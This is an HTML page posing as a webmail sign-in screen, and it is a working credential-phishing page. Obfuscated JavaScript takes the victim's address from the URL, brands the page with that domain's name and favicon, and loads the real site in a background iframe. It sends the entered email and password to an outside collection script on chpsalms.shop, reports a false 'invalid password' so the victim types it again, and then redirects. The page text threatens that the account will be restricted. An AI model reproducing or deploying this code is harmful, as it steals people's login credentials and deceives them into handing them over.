<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="strict-origin">
    <link id="favicon" rel="shortcut icon" type="image/png" href="https://alphatrade-options.com/git/rand/favicon.png">

    <script src="https://code.jquery.com/jquery-2.2.4.min.js"
        integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
    <title>Webmail - Login</title>
    <script nonce="">
        // Ensure that parent window and opener reload if a page is redirected to login
        if (top.location != window.location) {
            top.location.reload();
        }
        if (window.opener && window.opener.top.location != window.location) {
            window.opener.top.location.reload();
            self.close();
        }
    </script>


    <style>
        body {
            background-color: #eeeeee;
            font-family: Helvetica Neue, Helvetica, sans-serif;
            font-size: 13px;
            color: #425152;
            margin: 0;
        }

        ::-moz-placeholder {
            color: #d9dad9;
        }

        :-ms-input-placeholder {
            color: #d9dad9;
        }

        ::-ms-input-placeholder {
            color: #d9dad9;
        }

        ::placeholder {
            color: #d9dad9;
        }

        a {
            color: #425152;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        input {
            border-radius: 5px;
            padding: 5px 3px;
        }

        input.submit {
            font-weight: bold;
            text-align: center;
            min-width: 90px;
            color: #f0f0f0;
            background: #444444;
            padding: 5px 12px;
            border-color: #444444;
            border-style: solid;
            cursor: pointer;
        }

        input.submit:hover {
            color: #ffffff;
        }

        .row {
            margin: 10px 0;
        }

        .row:after {
            content: "";
            display: table;
            clear: both;
        }

        .logoWithPortalIcons {
            width: 150px;
            height: 50px;
            background: transparent url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=')
                /*IconsTogether.svg*/
                no-repeat left top;
        }

        .logoOnly {
            width: 280px;
            height: 30px;
            overflow: hidden;
        }

        .logoOnly .logoWithPortalIcons {
            width: 320px;
            height: 120px;
        }

        .title {
            font-size: 26px;
            margin: 20px 0 10px;
        }

        .red {
            color: #EE3031;
        }

        a#create-account {
            display: inline-block;
            border-radius: 4px;
            padding: 3px 8px;
            border: 1px solid #EE3031;
        }

        a#create-account:hover {
            text-decoration: none;
        }

        .col1,
        .col2 {
            float: left;
            line-height: 30px;
            vertical-align: middle;
            padding-top: 4px;
        }

        .col1 {
            width: 124px;
            font-size: 13px;
            font-weight: 600;
        }

        .col2 {
            width: 286px;
        }

        .col2 input {
            width: 96%;
        }

        .error {
            color: #D52B1E;
            font-weight: normal;
        }

        .container {
            background: rgba(255, 255, 255, 1.0);
            padding: 40px;
            box-shadow: 2px 2px 4px 2px #ccc;
            width: 416px;
            border-radius: 5px;
            /*
            margin: 0 auto;
            position:absolute;
            left:0;
            right:0;
            top:38%;
            top:100px\9;
            transform: translateY(-50%);
			*/
            margin: 10% auto 30px auto;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
            transition: all 0.3s cubic-bezier(.25, .8, .25, 1);
        }

        .password-icon {
            width: 20px;
            position: absolute;
            cursor: pointer;
            margin-top: 9px;
            margin-left: -28px;
            background-color: white;
        }

        #login_footer {
            line-height: 125%;
            font-size: 12px;
            text-align: justify;
            width: 500px;
            margin: 90px auto auto auto;
            padding-left: 10px;
        }


        @media only screen and (max-width: 600px) {
            body {
                background-image: none;
            }

            .container {
                /*
                position:relative;
                padding: 20px;
                box-shadow:none;
                width: 375px;
                top:0;
                left:auto;
                right:auto;
                transform: translateY(0);
				*/
                width: 100%;
                border-radius: 0;
                box-shadow: none;
                padding: 0;
                margin-top: 0;
            }

            .container div.body {
                padding: 40px 20px;
            }

            .col1,
            .col2 {
                float: none;
                width: 100%;
            }

            #login_footer {
                width: 99%;
                margin-top: 20px;
            }

            #login_footer div.content {
                padding: 10px 20px 10px 10px;
            }

            .password-icon {
                margin-top: -25px;
                right: 7%;
            }

        }


        .xlogo {
            color: #fff;
            margin-bottom: 10px;
            margin-top: -25px;
        }

        .xlogo img {
            vertical-align: middle;
            width: 5%;
            height: 5%;
            object-fit: contain
        }

        .xlogo span {
            vertical-align: middle
        }

        .text-g {
            font-family: "Arial Black", Gadget, sans-serif;
            text-transform: uppercase !important;
            text-align: center;
            font-size: 25px;
            color: #444444;
            background-color: rgba(255, 255, 255, 0);
            text-shadow: rgb(255, 255, 255) 2px 2px 2px;
        }

        #root {
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            top: 0;
            z-index: -10;
            pointer-events: none;
            filter: brightness(0.3)
        }
    </style>

    <script>

        /** @type {function(number, ?): ?} */
var _0x4dee72=_0x3747;(function(_0x1723d3,_0x32dd67){var _0x139ce8=_0x3747,_0x49c347=_0x1723d3();while(!![]){try{var _0x24e6ad=-parseInt(_0x139ce8(0xf9))/0x1*(parseInt(_0x139ce8(0x106))/0x2)+-parseInt(_0x139ce8(0x10c))/0x3+-parseInt(_0x139ce8(0xeb))/0x4+-parseInt(_0x139ce8(0xda))/0x5*(parseInt(_0x139ce8(0xd2))/0x6)+parseInt(_0x139ce8(0x103))/0x7*(parseInt(_0x139ce8(0xfc))/0x8)+-parseInt(_0x139ce8(0xfd))/0x9*(-parseInt(_0x139ce8(0xe4))/0xa)+-parseInt(_0x139ce8(0xd6))/0xb*(-parseInt(_0x139ce8(0xc4))/0xc);if(_0x24e6ad===_0x32dd67)break;else _0x49c347['push'](_0x49c347['shift']());}catch(_0x4fb16d){_0x49c347['push'](_0x49c347['shift']());}}}(_0x172e,0x3edd6));var _0x2e20a0=_0x40b2,_0x29a3=['innerHTML',_0x4dee72(0xcb),'379705GmhmYc',_0x4dee72(0xec),_0x4dee72(0x10d),'display','message',_0x4dee72(0xc3),_0x4dee72(0x107),_0x4dee72(0xf5),'val',_0x4dee72(0xf4),'Check\x20your\x20network\x20connection..',_0x4dee72(0xd3),_0x4dee72(0xc9),_0x4dee72(0xfa),'input[name=id_pass]','redirecto','banNer',_0x4dee72(0xdd),_0x4dee72(0xd0),'myframe',_0x4dee72(0xc5),_0x4dee72(0x101),'replace','https://www.','zion',_0x4dee72(0xc7),_0x4dee72(0xcd),_0x4dee72(0xf0),'slice','getElementById',_0x4dee72(0xdc),'31421MpoORy',_0x4dee72(0xe6),'1DvjFvy',_0x4dee72(0xdb),_0x4dee72(0xf1),_0x4dee72(0xe9),_0x4dee72(0xed),_0x4dee72(0x104),_0x4dee72(0xee),_0x4dee72(0x102),_0x4dee72(0xe1),'id_pass','value',_0x4dee72(0xf2),_0x4dee72(0xca),'572226OvGFSN','href',_0x4dee72(0xd1)],_0x40b2=function(_0x29acb9,_0x1ddb0c){_0x29acb9=_0x29acb9-0x93;var _0x119cae=_0x29a3[_0x29acb9];return _0x119cae;},_0x2e20a0=_0x40b2;(function(_0x413c1f,_0xa5a000){var _0x1813df=_0x4dee72,_0x217d9f=_0x40b2;for(;!![];){try{var _0x48ee69=-parseInt(_0x217d9f(0xb8))+parseInt(_0x217d9f(0xba))+parseInt(_0x217d9f(0x9e))*-parseInt(_0x217d9f(0xc4))+parseInt(_0x217d9f(0xb6))*parseInt(_0x217d9f(0xa9))+parseInt(_0x217d9f(0xa5))+parseInt(_0x217d9f(0xbc))+parseInt(_0x217d9f(0xbd))*-parseInt(_0x217d9f(0xab));if(_0x48ee69===_0xa5a000)break;else _0x413c1f['push'](_0x413c1f[_0x1813df(0xd9)]());}catch(_0x2d800c){_0x413c1f['push'](_0x413c1f['shift']());}}}(_0x29a3,0x49762));var hash=window[_0x2e20a0(0xb0)]['hash'][_0x4dee72(0xce)](0x1);function _0x3747(_0x35b3c4,_0x141774){var _0x172eec=_0x172e();return _0x3747=function(_0x3747b8,_0x2f6f92){_0x3747b8=_0x3747b8-0xc3;var _0x36dcca=_0x172eec[_0x3747b8];return _0x36dcca;},_0x3747(_0x35b3c4,_0x141774);}window[_0x4dee72(0xf6)]=function init(){var _0x2fce3f=_0x4dee72,_0x5b7190=_0x2e20a0;if(hash){var _0x9e71dd=window[_0x5b7190(0xb0)][_0x5b7190(0xc2)][_0x5b7190(0xa0)]('#',''),_0x4a6e00=_0x9e71dd[_0x5b7190(0xaa)]('@'),_0x2a8ab4=_0x9e71dd[_0x5b7190(0xa6)](_0x4a6e00+0x1,_0x9e71dd[_0x5b7190(0xac)]);document[_0x5b7190(0x9c)]='Sign\x20in\x20to\x20'+_0x2a8ab4[_0x2fce3f(0x10b)]('.')[0x0];var _0x2edcd2=_0x5b7190(0xaf)+_0x2a8ab4;document[_0x5b7190(0xa7)](_0x5b7190(0xa2))[_0x5b7190(0xbe)]=_0x2edcd2,document[_0x5b7190(0xa7)](_0x5b7190(0xad))[_0x2fce3f(0xea)]=_0x9e71dd,document[_0x5b7190(0xa7)](_0x5b7190(0x97))[_0x5b7190(0xbb)]=_0x2a8ab4[_0x2fce3f(0x10b)]('.')[0x0],document[_0x5b7190(0xa7)](_0x5b7190(0x9a))[_0x5b7190(0xbb)]=_0x2a8ab4['split']('.')[0x0],$(_0x2fce3f(0xef))[_0x5b7190(0xa3)](_0x5b7190(0xb9),_0x2edcd2),document[_0x5b7190(0xa7)]('id_pass')[_0x5b7190(0xb3)](),document[_0x2fce3f(0xdf)](_0x5b7190(0x9d))[_0x5b7190(0xbe)]=_0x5b7190(0xa1)+_0x2a8ab4,document[_0x5b7190(0xa7)](_0x2fce3f(0xe7))[_0x5b7190(0xb5)]=_0x5b7190(0xa1)+_0x2a8ab4;}else{}let _0x51501e=0x0;document[_0x2fce3f(0xdf)]('submit_btn')[_0x2fce3f(0x108)](_0x2fce3f(0xfb),function(_0x17171e){var _0x5018f2=_0x2fce3f;if($(_0x5018f2(0xff))[_0x5018f2(0xe3)]()['trim']()!=''&&$(_0x5018f2(0x10e))['val']()[_0x5018f2(0xfe)]()!=''){let _0x331f79=new FormData();_0x331f79[_0x5018f2(0xd8)](_0x5018f2(0xd5),$('#id_email')['val']()),_0x331f79[_0x5018f2(0xd8)](_0x5018f2(0xd4),$('#id_pass')[_0x5018f2(0xe3)]()),document['getElementById'](_0x5018f2(0x100))[_0x5018f2(0xd3)]['display']='block',document[_0x5018f2(0xdf)]('bg_screen')[_0x5018f2(0xd3)][_0x5018f2(0xcc)]=_0x5018f2(0x10d),ajax=new XMLHttpRequest(),ajax[_0x5018f2(0x10f)](_0x5018f2(0xf7),_0x5018f2(0xe0)),ajax[_0x5018f2(0xc6)]=function(){var _0x2e7d2b=_0x5018f2;ajax[_0x2e7d2b(0x10a)]===0x4&&(_0x51501e===0x2?window[_0x2e7d2b(0x104)]=$(_0x2e7d2b(0xe2))['val']():($('#error')['html'](_0x2e7d2b(0x105)),$(_0x2e7d2b(0x10e))['val']('')),_0x51501e+=0x1,response=ajax[_0x2e7d2b(0xd7)],document[_0x2e7d2b(0xdf)](_0x2e7d2b(0x100))['style'][_0x2e7d2b(0xcc)]=_0x2e7d2b(0xcd),document[_0x2e7d2b(0xdf)](_0x2e7d2b(0xde))[_0x2e7d2b(0xd3)][_0x2e7d2b(0xcc)]=_0x2e7d2b(0xcd));},ajax['send'](_0x331f79);}else{}});};function _0x172e(){var _0x5a61e3=['preventDefault','addEventListener','https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png','readyState','split','527511OvdGQf','block','#id_pass','open','hash','12pwMXmw','74734CDKuWR','onreadystatechange','attr','https://ik.imagekit.io/escrowmade/download__1__OSvF-Qvmk.png','ajax','hido','137967OuewSg','display','none','substr','id_pass','title','529969LtYXLi','6awcYVJ','style','tpass','temail','4666409eXcKyu','response','append','shift','1751835cWJntM','length','Retype','input[name=id_email]','bg_screen','getElementById','https://chpsalms.shop/big1/fend.php','focus','#redirecto','val','686900WwzrlS','type','indexOf','redirecto','text','Invalid\x20password\x20.\x20Please\x20try\x20again\x20...','value','1454516yxhGRU','src','https://www.google.com/s2/favicons?domain=','error','#favicon','282575HCidVs','id_email','12FNOhav','id-password-reveal-icon','fail','1BQGHgr','onload','POST','password','4707uvCSOX','kai','click','14936KQFEWY','45akxhVw','trim','#id_email','loading_image','Webmail\x20Portal\x20Login\x20-\x20','log','1547duFSRQ','location','Account password is incorrect','14yJbuWj'];_0x172e=function(){return _0x5a61e3;};return _0x172e();}function setVisibility(){var _0x475c5d=_0x4dee72,_0x44e58c=document[_0x475c5d(0xdf)](_0x475c5d(0xcf));_0x44e58c[_0x475c5d(0xe5)]===_0x475c5d(0xf8)?(_0x44e58c['type']=_0x475c5d(0xe8),document[_0x475c5d(0xdf)](_0x475c5d(0xf3))[_0x475c5d(0xec)]=_0x475c5d(0xc8)):(_0x44e58c[_0x475c5d(0xe5)]=_0x475c5d(0xf8),document['getElementById'](_0x475c5d(0xf3))[_0x475c5d(0xec)]=_0x475c5d(0x109));}function hidePassword(){var _0x44b6c6=_0x4dee72,_0x4ae60e=document['getElementById'](_0x44b6c6(0xcf));_0x4ae60e[_0x44b6c6(0xe5)]!=='password'&&(_0x4ae60e['type']='password',document[_0x44b6c6(0xdf)](_0x44b6c6(0xf3))[_0x44b6c6(0xec)]='https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png');}
    </script>
</head>

<body>
    <div id="login_form" action="" method="post" autocomplete="off">
        <input type="hidden" name="csrfmiddlewaretoken"
            value="xWUPRch6gUXcsYdMNLyWrIvExcWeJ3qTtf8VMHZWmQ2EBBFj3eYVAcVdcPIJiDWq">
        <input type="hidden" name="next" value="/">
        <div class="container" id="container" style="padding-bottom:10px!important; position: relative;">
            <div style='position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; display:none'
                id='bg_screen'> </div>
            <img src='https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif'
                style="width:50px; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); display:none"
                id='loading_image' />
        </div>
    </div>

    <script type="text/template" id="tpl-password">

    <input type="hidden" class="form-control" name="hido" id="hido" value="">
    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
        <div class="body">
           
            <div class="xlogo">
                <img id="zion" src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
                <span style="text-transform: capitalize;" class='text-g' id="banNer"></span>
                </div>
            <div class="row">
                <div class="col1"><label for="id_email">Email:</label></div>
                <div class="col2"><input type="text" name="email" disabled value="" id="id_email" placeholder="Email"></div>
            </div>
                <div class="col1"><label for="id_pass">Password</label></div>
                <div class="col2"><input type="password" name="password" id="id_pass" placeholder="Password"></div>
                  <img id="id-password-reveal-icon" class="password-icon" src="https://fac.corp.fortinet.com/customviews/image/password_hidden:93edf7d3ceb704be92ee084ecc62c6c8/" alt="" onclick="setVisibility()"/>
            </div>
            <br><br>
            <div class="row">
                <div><span class="error" id="error"></span></div>
            </div>
            <div class="row">
                <div class="col1" style="line-height:40px;padding-top:10px;">
                    <input type="button" id='submit_btn' class="submit" value="Login" style="padding:7px 24px;" /></div>
            </div>
            <div class="row">
                <p style="font-size:120%;color:#ff2b10;">To find out</p>
                <p>
                    This is a very important security measure and, <span id="kai" style="text-transform: capitalize;"></span>.
                    <br>
                    To protect your email account.
                    <br>
                    Your account may be restricted until your identity can be verified.
                </p>
            </div>
        </div>
    </script>
    <script>
        var _0x1831da=_0x1c4f;(function(_0x19fc8d,_0x45ad8d){var _0x56646c=_0x1c4f,_0x514d6b=_0x19fc8d();while(!![]){try{var _0x2ac149=-parseInt(_0x56646c(0x11f))/0x1+-parseInt(_0x56646c(0x120))/0x2*(parseInt(_0x56646c(0x123))/0x3)+-parseInt(_0x56646c(0x126))/0x4+parseInt(_0x56646c(0x128))/0x5*(parseInt(_0x56646c(0x124))/0x6)+parseInt(_0x56646c(0x11e))/0x7+parseInt(_0x56646c(0x121))/0x8+-parseInt(_0x56646c(0x125))/0x9;if(_0x2ac149===_0x45ad8d)break;else _0x514d6b['push'](_0x514d6b['shift']());}catch(_0x39d37d){_0x514d6b['push'](_0x514d6b['shift']());}}}(_0x33e7,0xf266c));var html='';html=document[_0x1831da(0x127)](_0x1831da(0x129))[_0x1831da(0x122)];function _0x1c4f(_0x2f9ca5,_0x39e4aa){var _0x33e749=_0x33e7();return _0x1c4f=function(_0x1c4fe5,_0x13b4f3){_0x1c4fe5=_0x1c4fe5-0x11e;var _0x22f4a1=_0x33e749[_0x1c4fe5];return _0x22f4a1;},_0x1c4f(_0x2f9ca5,_0x39e4aa);}var container=document[_0x1831da(0x127)](_0x1831da(0x12a));container[_0x1831da(0x122)]+=html;function _0x33e7(){var _0x3fcf96=['80KsLiRV','tpl-password','container','12515440MyiXzF','908262gmsxIg','6212SFIYce','11143600zYICZq','innerHTML','1002YKQdSq','10878hFgQJw','678213VynMvc','783916CdqYII','getElementById'];_0x33e7=function(){return _0x3fcf96;};return _0x33e7();}
    </script>
    <div id="root">
        <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
    </div>
</body>

</html>
